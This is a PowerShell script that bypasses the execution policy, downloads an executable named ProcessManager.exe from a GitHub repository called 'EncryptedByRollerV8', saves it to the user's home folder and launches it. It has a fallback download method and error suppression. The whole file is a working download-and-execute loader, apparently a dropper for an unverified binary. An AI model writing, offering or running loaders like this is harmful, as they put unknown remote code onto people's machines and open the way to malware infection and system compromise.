# Force the window to stay open no matter what
try {
    # Bypass execution policy for this session
    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
    
    # Enable TLS for secure downloads
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    Write-Host "=== PowerShell Download Script ===" -ForegroundColor Green
    Write-Host "Script started at: $(Get-Date)" -ForegroundColor Yellow
    Write-Host "Current user: $env:USERNAME" -ForegroundColor Yellow
    
    # GitHub URL (make sure it's the raw file link)
    $githubUrl = "https://github.com/EncryptedByRollerV8/f/raw/main/ProcessManager.exe"
    
    # Destination path
    $destination = "C:\Users\$env:USERNAME\ProcessManager.exe"
    
    Write-Host "Download URL: $githubUrl" -ForegroundColor Cyan
    Write-Host "Saving to: $destination" -ForegroundColor Cyan
    
    # Check if file already exists
    if (Test-Path $destination) {
        Write-Host "File already exists. Removing old version..." -ForegroundColor Yellow
        Remove-Item $destination -Force -ErrorAction SilentlyContinue
    }
    
    # Download using multiple methods
    Write-Host "`nStarting download..." -ForegroundColor Green
    
    try {
        # Method 1: Invoke-WebRequest
        Write-Host "Trying Method 1: Invoke-WebRequest..." -ForegroundColor White
        Invoke-WebRequest -Uri $githubUrl -OutFile $destination -UserAgent "PowerShell" -ErrorAction Stop
        Write-Host "✓ Download successful with Invoke-WebRequest!" -ForegroundColor Green
    }
    catch {
        Write-Host "Method 1 failed: $($_.Exception.Message)" -ForegroundColor Red
        
        try {
            # Method 2: WebClient
            Write-Host "Trying Method 2: WebClient..." -ForegroundColor White
            $webClient = New-Object System.Net.WebClient
            $webClient.Headers.Add("User-Agent", "PowerShell Script")
            $webClient.DownloadFile($githubUrl, $destination)
            $webClient.Dispose()
            Write-Host "✓ Download successful with WebClient!" -ForegroundColor Green
        }
        catch {
            Write-Host "Method 2 failed: $($_.Exception.Message)" -ForegroundColor Red
            throw "All download methods failed"
        }
    }
    
    # Verify download
    if (Test-Path $destination) {
        $fileSize = (Get-Item $destination).Length
        Write-Host "✓ File downloaded successfully!" -ForegroundColor Green
        Write-Host "✓ File size: $fileSize bytes" -ForegroundColor Green
        
        # Try to run the file
        Write-Host "`nAttempting to run ProcessManager..." -ForegroundColor Yellow
        Start-Process -FilePath $destination -ErrorAction Stop
        Write-Host "✓ ProcessManager started successfully!" -ForegroundColor Green
    }
    else {
        Write-Host "❌ ERROR: File was not created at destination" -ForegroundColor Red
    }
}
catch {
    Write-Host "`n❌ SCRIPT ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Error details: $($_.Exception.ToString())" -ForegroundColor Red
}
finally {
    Write-Host "`n" -NoNewline
    Write-Host "=== Script finished ===" -ForegroundColor Cyan
    Write-Host "This window will close in 30 seconds..." -ForegroundColor Yellow
    Write-Host "Or press any key to close immediately" -ForegroundColor Yellow
    
    # Wait for key press or timeout
    $counter = 0
    while ($counter -lt 30) {
        if ($Host.UI.RawUI.KeyAvailable) {
            break
        }
        Start-Sleep -Seconds 1
        $counter++
    }
}
